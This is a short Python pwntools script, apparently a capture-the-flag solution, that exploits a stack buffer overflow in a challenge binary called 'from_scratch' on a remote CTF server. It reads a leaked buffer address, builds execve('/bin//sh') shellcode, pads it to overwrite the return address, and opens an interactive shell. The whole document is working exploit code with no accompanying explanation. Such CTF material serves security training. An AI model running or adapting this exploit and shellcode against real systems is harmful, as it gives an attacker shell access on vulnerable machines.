from pwn import *

context.arch = 'amd64'
#p = process('./from_scratch')
p = remote("pwn-ctf.cyberspace.ma", 8002)
p.recvuntil(b"Buffer address: ")
buffer_addr = int(p.recvline(), 16)
print(f"Buffer Address: {hex(buffer_addr)}")

shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    push 0x3b
    pop rax
    syscall
''')

if b"\x80" in shellcode:
    print("Shellcode contains forbidden byte!")
    exit(1)

payload = shellcode.ljust(72, b'A')
payload += p64(buffer_addr)

p.sendline(payload)
p.interactive()
